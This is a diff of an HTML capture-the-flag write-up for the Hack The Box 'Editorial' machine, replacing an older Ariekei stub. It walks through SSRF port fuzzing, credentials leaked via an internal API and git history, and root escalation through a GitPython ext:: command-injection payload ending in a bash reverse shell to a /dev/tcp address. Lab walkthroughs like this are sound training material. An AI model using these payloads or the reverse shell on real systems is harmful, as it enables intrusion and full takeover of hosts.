@@ -61,14 +61,13 @@
     <h2>Enumeration:</h2>
     <h3>Nmap:</h3>
     <!-- Terminal Window: Rustscan Output -->
-    <div class="terminal-window">
+                <div class="terminal-window">
         <div class="window-header">
             <span class="button close"></span>
             <span class="button minimize"></span>
             <span class="button maximize"></span>
         </div>
-        <div class="terminal">
-            <pre><code class="language-bash">nmap -sC -sV 10.10.11.20 -oA nmap/Editorial
+        <div class="terminal"><pre><code>nmap -sC -sV 10.10.11.20 -oA nmap/Editorial
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 18:26 IST
 Nmap scan report for 10.10.11.20
 Host is up (0.042s latency).
@@ -85,16 +84,447 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
-</code></pre>
+</code></pre></div></div>
+<p>The scan reveals two open ports:</p>
+<ul class="bulleted-list">
+  <li style="list-style-type:disc">
+    <strong>Port 22 (SSH)</strong>
+    <ul class="bulleted-list">
+      <li style="list-style-type:circle">Running <strong>OpenSSH 8.9p1</strong> on Ubuntu</li>
+      <li style="list-style-type:circle">This could be useful later for gaining a foothold if valid credentials are found.</li>
+    </ul>
+  </li>
+  <li style="list-style-type:disc">
+    <strong>Port 80 (HTTP)</strong>
+    <ul class="bulleted-list">
+      <li style="list-style-type:circle">Running <strong>nginx 1.18.0</strong> on Ubuntu</li>
+      <li style="list-style-type:circle">The server responds with an HTTP redirect to <code>http://editorial.htb</code>, suggesting a virtual host configuration.</li>
+    </ul>
+  </li>
+</ul>
+<br><br>
+<p>
+  Since the <code>nmap</code> scan indicates that the web server redirects to <code>http://editorial.htb</code>, we need to add the hostname to our <code>/etc/hosts</code> file to resolve it properly.
+</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
         </div>
-    </div>
-    <p>
-        The target has three open ports: <strong>22/tcp</strong> and <strong>1022/tcp</strong> running SSH (OpenSSH 7.2p2 and 6.6.1p1), and 
-        <strong>443/tcp</strong> hosting an SSL-enabled web service (nginx 1.10.2) with domains <strong>calvin.ariekei.htb</strong> and 
-        <strong>beehive.ariekei.htb</strong>. These services provide avenues for further enumeration.
-    </p>
+        <div class="terminal"><pre><code>echo &quot;10.10.11.20 editorial.htb&quot; | sudo tee -a /etc/hosts
+</code></pre></div></div>
+</section>
+
+<section id="Web enumeration" class="section">
+<h2>Web enumeration:</h2><p>Visiting the web page, we find that it resembles a book publishing platform.</p></li></ul>
+<br><br>
+<img src="./image.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;"><p>
+    <br><br>
+</p><p><code><strong>/upload</strong></code> – Appears to be an upload portal for books, which could be a potential attack surface for file upload exploitation. Additionally, there is a <strong>URL submission feature</strong>, which could potentially be vulnerable to <strong>Server-Side Request Forgery (SSRF)</strong>.</p><p>
+</p>
+<br><br>
+<img src="./image 1.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;"></section>
+
+<section id="Vulnerability Assessment" class="section">
+<h2>Vulnerability Assessment:</h2><p>
+</p><p>Since the <strong>URL submission feature</strong> on <code>/upload</code> allows users to submit links, we test it for <strong>Server-Side Request Forgery (SSRF)</strong> by attempting to make the server connect to our <strong>Python HTTP server</strong>.</p>
+<br><br>
+<img src="./image 2.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;"><p>
+</p><br><br>
+<p>When submitting our <strong>attacker server link (</strong><code><strong>http://10.10.x.x:1234/</strong></code><strong>)</strong> in the URL submission feature and clicking <strong>Preview</strong>, we successfully receive a connection from the target machine (<code>10.10.11.20</code>).</p>
+<br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.11.20 - - [14/Feb/2025 11:13:33] &quot;GET / HTTP/1.1&quot; 200 -
+</code></pre></div></div>
+<br><br>
+<h3>SSRF Exploitation:</h3><p>After confirming SSRF, we proceed with <strong>internal service enumeration</strong>. We capture the request in <strong>Burp Suite</strong>, save it to a file (<code>request.req</code>), and use <code>ffuf</code> to fuzz for open ports on the internal server.</p><p>
+</p><br><br>
+<img src="./image 3.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;"><p>
+</p>
+<br><br><p><strong>Using FFUF to Enumerate Internal Ports : </strong></p><p>We execute the following command to probe all <strong>65,535 ports</strong> on <code>127.0.0.1</code>:</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code> ffuf -request request.req -request-proto http -w &lt;(seq 1 65535) -fr &quot;1630734277837_ebe62757b6e0.jpeg&quot;
+
+        /&#x27;___\  /&#x27;___\           /&#x27;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://editorial.htb/upload-cover
+ :: Wordlist         : FUZZ: /proc/self/fd/11
+ :: Header           : Referer: http://editorial.htb/upload
+ :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+ :: Header           : Accept-Encoding: gzip, deflate, br
+ :: Header           : Connection: keep-alive
+ :: Header           : Content-Type: multipart/form-data; boundary=---------------------------28859221871595367122082090122
+ :: Header           : Origin: http://editorial.htb
+ :: Header           : Priority: u=0
+ :: Header           : Host: editorial.htb
+ :: Header           : Accept: */*
+ :: Header           : Accept-Language: en-US,en;q=0.5
+ :: Data             : -----------------------------28859221871595367122082090122
+Content-Disposition: form-data; name=&quot;bookurl&quot;
+
+http://127.0.0.1:FUZZ
+-----------------------------28859221871595367122082090122
+Content-Disposition: form-data; name=&quot;bookfile&quot;; filename=&quot;&quot;
+Content-Type: application/octet-stream
+
+
+-----------------------------28859221871595367122082090122--
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: 1630734277837_ebe62757b6e0.jpeg
+________________________________________________
+
+5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 126ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)</code></pre></div></div>
+<br><br>
+<p><strong>Fuzzing</strong> detects <strong>port 5000</strong> as open</p><p>After identifying <strong>port 5000</strong> as open, we send a request to <code>http://127.0.0.1:5000</code> via <strong>Burp Suite Repeater</strong>. </p>
+<br><br>
+<img src="./image 4.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;"><p>
+</p>
+<br><br>
+<p>The response returns a <strong>200 OK</strong> status along with a reference to a file:</p>
+<br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>static/uploads/d9e45fd9-c245-41f3-9396-80598c36f149</code></pre></div></div>
+        <br><br>
+        <p> We used <code>curl</code> to query <code>http://editorial.htb/</code><code><strong>static/uploads/d9e45fd9-c245-41f3-9396-80598c36f149</strong></code> and discovered multiple API endpoints.</p><p>
+</p>
+<br><br>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>curl http://editorial.htb/static/uploads/d9e45fd9-c245-41f3-9396-80598c36f149 | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   911  100   911    0     0   8345      0 --:--:-- --:--:-- --:--:--  8357
+{
+  &quot;messages&quot;: [
+    {
+      &quot;promotions&quot;: {
+        &quot;description&quot;: &quot;Retrieve a list of all the promotions in our library.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/messages/promos&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    },
+    {
+      &quot;coupons&quot;: {
+        &quot;description&quot;: &quot;Retrieve the list of coupons to use in our library.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/messages/coupons&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    },
+    {
+      &quot;new_authors&quot;: {
+        &quot;description&quot;: &quot;Retrieve the welcome message sended to our new authors.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/messages/authors&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    },
+    {
+      &quot;platform_use&quot;: {
+        &quot;description&quot;: &quot;Retrieve examples of how to use the platform.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/messages/how_to_use_platform&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    }
+  ],
+  &quot;version&quot;: [
+    {
+      &quot;changelog&quot;: {
+        &quot;description&quot;: &quot;Retrieve a list of all the versions and updates of the api.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata/changelog&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    },
+    {
+      &quot;latest&quot;: {
+        &quot;description&quot;: &quot;Retrieve the last version of api.&quot;,
+        &quot;endpoint&quot;: &quot;/api/latest/metadata&quot;,
+        &quot;methods&quot;: &quot;GET&quot;
+      }
+    }
+  ]
+}
+</code></pre></div></div>
+<br><br>
+<p>Among these, the <code>/api/latest/metadata/messages/authors</code> endpoint appeared interesting for further investigation.Using the same SSRF vulnerability, we sent a request to <code><strong>http://127.0.0.1:5000/api/latest/metadata/messages/authors</strong></code> and received a response.</p><p>
+</p><br><br>
+<img src="./image 5.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+<br><br><br><br>
+<p>The response returns a <strong>200 OK</strong> status along with a reference to a file:</p>
+<div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>/static/uploads/ef809966-7276-4b87-ac4c-01ac50211a2e</code></pre></div></div><br><br><p>By curling this file : </p><p>We obtained sensitive information, including internal login credentials.</p><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>curl http://editorial.htb/static/uploads/ef809966-7276-4b87-ac4c-01ac50211a2e
+{&quot;template_mail_message&quot;:&quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&quot;}
+                                    </code></pre></div></div>
+</section>
+
+<section id="Lateral_Movement" class="section">
+<h2>Lateral Movement:</h2><p>With the obtained credentials , we attempted SSH access as the <strong>dev</strong> user:</p>
+<br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>ssh dev@editorial.htb                  
+The authenticity of host &#x27;editorial.htb (10.10.11.20)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;editorial.htb&#x27; (ED25519) to the list of known hosts.
+dev@editorial.htb&#x27;s password: 
+
+&lt;SNIP&gt;
+
+Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
+dev@editorial:~$ ls -la
+total 32
+drwxr-x--- 4 dev  dev  4096 Jun  5  2024 .
+drwxr-xr-x 4 root root 4096 Jun  5  2024 ..
+drwxrwxr-x 3 dev  dev  4096 Jun  5  2024 apps
+lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 dev  dev  3771 Jan  6  2022 .bashrc
+drwx------ 2 dev  dev  4096 Jun  5  2024 .cache
+-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile
+-rw-r----- 1 root dev    33 Feb 13 12:37 user.txt
+</code></pre></div></div><br><br><p>
+</p><p>Inside <strong>dev</strong>&#x27;s home directory, we found an <code>apps</code> folder.</p><p>Although it appeared empty, we discovered a hidden <code>.git</code> directory. This indicates the presence of a Git repository, which could contain sensitive information or credentials in its history.</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>dev@editorial:~$ cd app
+dev@editorial:~/apps$ ls -la
+total 12
+drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
+drwxr-x--- 5 dev dev 4096 Feb 14 05:38 ..
+drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
+</code></pre></div></div><br><br><p>Now, using <code>git log</code>, we identified several commits related to API changes and debugging.</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>dev@editorial:~/apps$ git log
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+    fix: bugfix in api port endpoint
+
+commit dfef9f20e57d730b7d71967582035925d57ad883
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:01:11 2023 -0500
+
+    change: remove debug and update api port
+
+commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:55:08 2023 -0500
+
+    change(api): downgrading prod to dev
     
-    <img src="./printer.png" alt="Upload Endpoint Screenshot" style="max-width: 100%; height: auto;">
+    * To use development environment.
+
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+    
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:48:43 2023 -0500
+
+    feat: create editorial app
+    
+    * This contains the base of this project.
+    * Also we add a feature to enable to external authors send us their
+       books and validate a future post in our editorial.
+</code></pre></div></div><br><br><p> The commit message<strong> &quot;It (will) contains internal info about the editorial, this enable faster access to information.&quot;</strong> seems interesting, as it might contain sensitive information that was removed.</p><p>Using <code>git show 1e84a036b2f33c59e2390730699a488c65643d28</code>, we discovered credentials for the <strong>prod</strong> user</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>git show 1e84a036b2f33c59e2390730699a488c65643d28
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+    
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+diff --git a/app_api/app.py b/app_api/app.py
+
+&lt;SNIP&gt;
+Username: prod\nPassword: 080217_Producti0n_2023!@\n
+&lt;SNIP&gt;</code></pre></div></div><br><br><p>Now, we can attempt <strong>SSH login as the prod user.</strong> to further escalate privileges:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>ssh prod@editorial.htb   
+prod@editorial.htb&#x27;s password: 
+prod@editorial:~$
+</code></pre></div></div></section>
+
+<section id="Privilage Escalation" class="section">
+    <h2>Privilege Escalation:</h2><p>We check <strong>sudo privileges</strong> using <code>sudo -l</code>, revealing that <strong>prod</strong> can execute  as root.</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:~$ sudo -l 
+[sudo] password for prod: 
+Matching Defaults entries for prod on editorial:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</code></pre></div></div><br><br><h3>Exploiting <code>clone_prod_change.py</code></h3><p>Since <strong>Python scripts executed with sudo</strong> can often be modified or abused, we check the script&#x27;s contents:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
+#!/usr/bin/python3
+
+import os
+import sys
+from git import Repo
+
+os.chdir(&#x27;/opt/internal_apps/clone_changes&#x27;)
+
+url_to_clone = sys.argv[1]
+
+r = Repo.init(&#x27;&#x27;, bare=True)
+r.clone_from(url_to_clone, &#x27;new_changes&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;])
+</code></pre></div></div><br><br><p>The <code>git</code> binary on the box is version 2.34.1:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:/$ git --version
+git version 2.34.</code></pre></div></div><br><br><p>However, it’s not running that binary. The script is running the Python Git package <a href="https://github.com/gitpython-developers/GitPython">GitPython</a>, version 3.1.29:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:/$ pip freeze | grep -i git
+gitdb==4.0.10
+GitPython==3.1.29</code></pre></div></div><br><br><p>
+</p><h3>GitPython Arbitrary Code Execution (CVE-2023-40267) :</h3><p>The installed version of <strong>GitPython (3.1.29)</strong> has a <strong>known arbitrary code execution vulnerability</strong> (<a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">SNYK-PYTHON-GITPYTHON-3113858</a>). Since the vulnerable script is executed with <strong>root privileges</strong>, we can exploit this to <strong>execute arbitrary commands as root</strong>.</p><p>We test by creating a file as root:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#x27;ext::sh -c touch% /tmp/pwned&#x27;
+Traceback (most recent call last):
+  File &quot;/opt/internal_apps/clone_changes/clone_prod_change.py&quot;, line 12, in &lt;module&gt;
+    r.clone_from(url_to_clone, &#x27;new_changes&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;])
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;, line 1275, in clone_from
+    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/repo/base.py&quot;, line 1194, in _clone
+    finalize_process(proc, stderr=stderr)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/util.py&quot;, line 419, in finalize_process
+    proc.wait(**kwargs)
+  File &quot;/usr/local/lib/python3.10/dist-packages/git/cmd.py&quot;, line 559, in wait
+    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
+git.exc.GitCommandError: Cmd(&#x27;git&#x27;) failed due to: exit code(128)
+  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /tmp/D3p4K new_changes
+  stderr: &#x27;Cloning into &#x27;new_changes&#x27;...
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.</code></pre></div></div><br><br><p>After execution, we confirm that <code>/tmp/pwned</code> was successfully created, proving code execution.</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>prod@editorial:~$ ls -la /tmp/pwned
+total 1680
+-rw-r--r--  1 root root      0 Feb 14 06:03 pwned</code></pre></div></div><br><br>
+<h3><strong>Getting a root shell:</strong></h3><p>Now, we replace the payload with a reverse shell:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c bash% -c% &#x27;bash% -i% &gt;&amp;% /dev/tcp/10.10.14.22/4444% 0&gt;&amp;1&#x27;&quot;</code></pre></div></div><br><br><p> we receive a root shell:</p><br><br><div class="terminal-window">
+        <div class="window-header">
+            <span class="button close"></span>
+            <span class="button minimize"></span>
+            <span class="button maximize"></span>
+        </div>
+        <div class="terminal"><pre><code>nc -lnvp 4444               
+listening on [any] 4444 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.11.20] 43204
+root@editorial:/opt/internal_apps/clone_changes# cd 
+cd 
+root@editorial:~# ls
+ls
+root.txt
+root@editorial:~# cat root.txt
+cat root.txt
+</code></pre></div></div>
 </section>
  </div>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
